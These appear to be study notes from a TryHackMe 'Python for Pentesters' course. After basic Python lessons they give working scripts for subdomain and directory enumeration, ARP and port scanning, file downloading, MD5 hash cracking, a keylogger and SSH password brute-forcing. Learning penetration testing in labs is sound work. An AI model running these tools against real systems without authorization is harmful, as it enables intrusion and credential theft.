- Variables
- Loops
- Functions
- Data Structures
- If statements
- Files

Python can be the most powerful tool in your arsenal as it can be used to build almost any of the other penetration testing tools.
- Use Python to enumerate the target's subdomain
- Build a simple keylogger
- Scan the network to find target systems
- Scan any target to find the open ports
- Download files from the internet
- Crack hashes

## Prerequisites
**While Loops**
Let's begin by looking at how we structure a while loop. We can have the loop run indefinitely or (similar to an if statement) determine how many times the loop should run based on a condition.

```python
i = 1
while i <= 10:
     print(i)
     i = i + 1
```

This while loop will run 10 times, outputting the value of the i variable each time it iterates (loops). Let's break this down:
- The i variable is set to 1
- The while statement specifies where the start of the loop should begin
- Every time it loops, it will start at the top (outputting the value of i)
- Then it goes to the next line in the loop, which increases the value of i by 1
- Then (as there is no more code for the program to execute), it goes to the top of the loop, starting the process over again
- The program will keep on looping until the value of the i variable is greater than 10

**For Loops**
A for loop is used to iterate over a sequence such as a list. Lists are used to store multiple items in a single variable, and are created using square brackets (see below). Let's learn through the following example:

```python
websites = ["facebook.com", "google.com", "amazon.com"]
for site in websites:
     print(site)
```

This for loop shown in the code block above, will run 3 times, outputting each website in the list. Let's break this down:
- The list variable called websites is storing 3 elements
- The loop iterates through each element, printing out the element
- The program stops looping when it's been through each element in the loop

### Functions
A function can also return a result, see the code block below:
```python
def calcCost(item):
     if(item == "sweets"):
          return 3.99
     elif (item == "oranges"):
          return 1.99
     else:
          return 0.99

spent = 10
spent = spent + calcCost("sweets")
print("You have spent:" + str(spent))
```

### Files
In Python, you can read and write from files. We've seen that in cyber security, it's common to write a script and import or export it from a file; whether that be as a way to store the output of your script or to import a list of 100's of websites from a file to enumerate. Let's dive straight into an example:
```python
f = open("file_name", "r")
print(f.read())
```

To open the file, we use the built-in open() function, and the "r" parameter stands for "read" and is used as we're reading the contents of the file. The variable has a read() method for reading the contents of the file. You can also use the readlines() method and loop over each line in the file; useful if you have a list where each item is on a new line. In the example above, the file is in the same folder as the Python script; if it were elsewhere, you would need to specify the full path of the file.

You can also create and write files. If you're writing to an existing file, you open the file first and use the "a" in the open function after the filename call (which stands for append). If you're writing to a new file, you use "w" (write) instead of "a". See the examples below for clarity:
```python
f = open("demofile1.txt", "a") # Append to an existing file
f.write("The file will include more text..")
f.close()

f = open("demofile2.txt", "w") # Creating and writing to a new file
f.write("demofile2 file created, with this content in!")
f.close()
```

Notice we use the close() method after writing to a file; this closes the file so no more writing to the file (within the program) can occur.

### Imports
In Python, we can import libraries, which are a collection of files that contain functions. Think of importing a library as importing functions you can use that have been already written for you. For example, there is a "date" library that gives you access to hundreds of different functions for anything date and time-related.
```python
import datetime
current_time = datetime.datetime.now()
print(current_time)
```

Here are some popular libraries you may find useful in scripting as a pentester:
- Request - simple HTTP library.
- [Scapy](https://scapy.readthedocs.io/en/latest/introduction.html) - send, sniff, dissect and forge network packets
- [Pwntools](https://docs.pwntools.com/en/stable/) - a CTF & exploit development library.

To install the "scapy" library (which allows you to craft your own packets in code and send them to other machines); you install it first by running the command `pip install scapy`, after which in your program you can now import the scapy library.

## **Subdomain Enumeration**
Finding subdomains used by the target organization is an effective way to increase the attack surface and discover more vulnerabilities.  
  
The script will use a list of potential subdomains and prepends them to the domain name provided via a command-line argument then tries to connect to the subdomains and assumes the ones that accept the connection exist.
	![[Pasted image 20240905025827.png]]

```python
import requests 
import sys 

sub_list = open("subdomains.txt").read() 
subdoms = sub_list.splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}" 

    try:
        requests.get(sub_domains)
    
    except requests.ConnectionError: 
        pass
    
    else:
        print("Valid domain: ",sub_domains)   
```

## **Directory Enumeration**
As it is often pointed out, reconnaissance is one of the most critical steps to the success of a penetration testing engagement. Once subdomains have been discovered, the next step would be to find directories.

The following code will build a simple directory enumeration tool.
```python
import requests 
import sys 

sub_list = open("wordlist.txt").read() 
directories = sub_list.splitlines()

for dir in directories:
    dir_enum = f"http://{sys.argv[1]}/{dir}.html" 
    r = requests.get(dir_enum)
    if r.status_code==404: 
        pass
    else:
        print("Valid directory:" ,dir_enum)
```

![[Pasted image 20240905030119.png]]
![[Pasted image 20240905033725.png]]

## **Network Scanner**
Python can be used to build a simple ICMP (Internet Control Message Protocol) scanner to identify potential targets on the network. However, ICMP packets can be monitored or blocked as the target organization would not expect a regular user to “ping a server”. On the other hand, systems can be configured to not respond to ICMP requests. These are the main reasons why using the ARP (Address Resolution Protocol) to identify targets on the local network is more effective.

```python
from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range) 

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
        print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))     
```

![[Pasted image 20240905034629.png]]

## **Port Scanner**
```python
 
import sys
import socket
import pyfiglet


ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)


ip = '192.168.1.6' 
open_ports =[] 

ports = range(1, 65535)


def probe_port(ip, port, result = 1): 
  try: 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(0.5) 
    r = sock.connect_ex((ip, port))   
    if r == 0: 
      result = r 
    sock.close() 
  except Exception as e: 
    pass 
  return result


for port in ports: 
    sys.stdout.flush() 
    response = probe_port(ip, port) 
    if response == 0: 
        open_ports.append(port) 
    

if open_ports: 
  print ("Open Ports are: ") 
  print (sorted(open_ports)) 
else: 
  print ("Looks like no ports are open :(")

```

**importing modules that will help the code run:**
```python
import sys
import socket
```
 
**Specifying the target:****
```python
ip = '192.168.1.6' 
```

**An empty “open_ports” array that will be populated later with the detected open ports:**  
```python
open_ports =[] 
```

**Ports that will be probed:****
```python

ports = range(1, 65535)
```

For this example, we have chosen to scan all TCP ports using the range() function. However, if you are looking for a specific service or want to save time by scanning a few common ports, the code could be changed as follows;
```python
ports = { 21, 22, 23, 53, 80, 135, 443, 445}
```

The list above is relatively small. As we are trying to keep a rather low profile, we have limited the list to ports that will likely be used by systems connected to a corporate network.Getting the IP address of the domain name given as target. The code also works if the user directly provides the IP address.
```python
ip = socket.gethostbyname(host)
```

Tries to connect to the port:
![](https://i.imgur.com/Pqzw6Sh.png)

Code is followed by a for loop that iterates through the specified port list:
![](https://i.imgur.com/wdzK7DK.png)

## **File Downloader**
Wget on Linux systems or Certutil on Windows are useful tools to download files.

Python can also be used for the same purpose.  
```python
 
import requests

url = 'https://assets.tryhackme.com/img/THMlogo.png'
r = requests.get(url, allow_redirects=True)
open('THMlogo.png', 'wb').write(r.content)

```

This short piece of code can easily be adapted to retrieve any other type of file, as seen below:
```python
 
import requests

url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
open('PSTools.zip', 'wb').write(r.content)  

```

﻿﻿Note:
	﻿﻿PSexec allow system administrators to run commands on remote Windows systems. We see that PSexec is also used in cyber attacks as it is usually not detected by antivirus software. You can learn more about PSexec [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) and read [this](https://www.praetorian.com/blog/threat-hunting-how-to-detect-psexec/) blogpost about its use by attackers.﻿﻿
	![[Pasted image 20240905040632.png]]


## **Hash Cracker**
A Hash is often used to safeguard passwords and other important data. As a penetration tester, you may need to find the cleartext value for several different hashes. The Hash library in Python allows you to build hash crackers according to your requirements quickly.

Hashlib is a powerful module that supports a wide range of algorithms.
![[Pasted image 20240905150558.png]]

```python
import hashlib

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

with open(wordlist_location, 'r') as file:
    for line in file.readlines():
        hash_ob = hashlib.md5(line.strip().encode())
        hashed_pass = hash_ob.hexdigest()
        if hashed_pass == hash_input:
            print('Found cleartext password! ' + line.strip())
            exit(0)
```

The script below follows an approach close to the one described above;
1. Asks for the location of a wordlist
2. Asks for the hash to be cracked
3. Reads values from the wordlist (one per line)
4. Converts cleartext values to MD5 hash values
5. Compares the generated MD5 hash value with the value entered by the user
	![[Pasted image 20240905153330.png]]

## **Keyloggers**
Modules allow us to solve relatively difficult problems in a simple way.  A good example is the “keyboard” module, which allows us to interact with the keyboard.  
`pip3 install keyboard`.

Using the keyboard module, the following three lines of code would be enough to record and replay keys pressed:
```python
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
```

## **SSH Brute Forcing**
The powerful Python language is supported by a number of modules that easily extend its capabilities. `Paramiko` is an SSHv2 implementation that will be useful in building SSH clients and servers.

The example below shows one way to build an SSH password brute force attack script. As is often the case in programming, there rarely is a single correct answer for these kinds of applications. As a penetration tester, your usage of programming languages will be different for developers. While they may care about best practices and code hygiene, your goal will more often be to end with a code that works as you want it to.
```python
import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()
```


**SH Connection:** This section will create the "ssh_connect" function. Successful authentication will return a code 0, a failed authentication will return a code 1.
	![[Pasted image 20240905154332.png]]

**Password list:** We then open the password file supplied earlier by the user and take each line as a password to be tried.
	![[Pasted image 20240905154455.png]]

**Responses:** The script tries to connect to the SSH server and decides on an output based on the response code. Please note the response code here is the one generated by Paramiko and not an HTTP response code. The script exits once it has found a valid password.
	![[Pasted image 20240905154530.png]]
	